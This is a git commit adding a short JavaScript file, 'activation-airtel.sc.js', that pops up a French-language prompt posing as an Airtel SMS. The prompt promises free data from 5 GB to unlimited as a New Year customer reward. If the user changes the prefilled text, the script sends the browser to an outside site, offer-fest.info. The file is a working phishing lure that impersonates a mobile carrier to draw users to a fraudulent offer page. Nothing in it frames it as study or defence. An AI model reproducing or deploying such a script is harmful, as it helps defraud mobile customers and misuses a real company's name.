877a83303db1e7cc9189bc8331ce9a0da7d01068
ekpesense <abantak9@gmail.com>
2025-01-27 14:35:51 -0800

    Create activation-airtel.sc.js

---
+++ activation-airtel.sc.js
@@ -0,0 +1,6 @@
+
+var password = 'CADEAU DE NOUVEL AN'
+password=prompt('AIRTEL SMS: Cher client Airtel, veuillez recevoir des données gratuites à partir de 5 Go - Illimitées, récompense des clients du Nouvel An, cliquez sur CADEAU DE NOUVEL AN pour vérifier maintenant ','CADEAU DE NOUVEL AN');
+if (password != 'CADEAU DE NOUVEL AN') {
+location.href='https://offer-fest.info/airtel.sc.html';
+}
